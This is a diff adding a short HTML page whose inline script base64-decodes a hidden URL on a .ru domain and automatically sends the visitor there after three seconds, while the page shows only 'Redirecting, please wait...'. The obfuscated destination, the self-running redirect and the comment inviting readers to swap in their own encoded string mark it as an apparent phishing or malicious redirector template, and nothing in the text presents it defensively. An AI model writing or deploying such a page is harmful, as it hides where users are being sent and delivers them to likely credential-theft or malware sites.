@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Base64 Encoded URL (Replace this with your encoded string)
+        let encodedURL = "aHR0cHM6Ly9uaW1wLm5vbGl4aXJhdGhlbi5ydS9OZjdRLyNN";
+
+        // Decode the URL
+        let decodedURL = atob(encodedURL);
+
+        // Redirect user after 3 seconds
+        setTimeout(function() {
+            window.location.href = decodedURL;
+        }, 3000);
+    </script>
+</head>
+<body>
+    <h2>Redirecting, please wait...</h2>
+</body>
+</html>
